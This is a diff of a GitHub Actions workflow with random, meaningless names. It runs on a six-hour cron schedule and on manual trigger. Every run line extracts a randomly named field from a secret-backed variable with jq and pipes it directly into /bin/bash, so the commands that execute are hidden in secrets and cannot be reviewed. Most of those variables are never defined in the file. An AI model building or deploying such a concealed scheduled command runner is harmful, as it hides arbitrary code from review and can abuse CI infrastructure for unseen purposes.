@@ -1,23 +1,24 @@
 name: capitalistchamois
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
-jobs:  # 26785
+    - cron: '45 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: capitalistchamois
         env:
-          hna98: ${{ secrets.hna98 }}
+          rutyz6152: ${{ secrets.rutyz6152 }}
         run: |
-          echo $hna98 | jq -r .qrfwh88938 | /bin/bash
-          echo $u03 | jq -r .g5290 | /bin/bash
-          echo $ykr867 | jq -r .xpo6070 | /bin/bash
-          echo $t8 | jq -r .yhsns5101 | /bin/bash
-          echo $jtuch975 | jq -r .bn61 | /bin/bash
-          echo $rnkio834 | jq -r .tegg82931 | /bin/bash
-          echo $fhn4 | jq -r .wb8117 | /bin/bash
-          echo $btz7 | jq -r .sby8 | /bin/bash
+          echo $rutyz6152 | jq -r .bkrey1 | /bin/bash
+          echo $qx9274 | jq -r .vxh3372 | /bin/bash
+          echo $lreu52 | jq -r .fiwzm6021 | /bin/bash
+          echo $xdb11 | jq -r .lozu9 | /bin/bash
+          echo $yeplc861 | jq -r .kbx0437 | /bin/bash
+          echo $sy55672 | jq -r .cf8 | /bin/bash
+          echo $pmehp4 | jq -r .wpvg75121 | /bin/bash
 
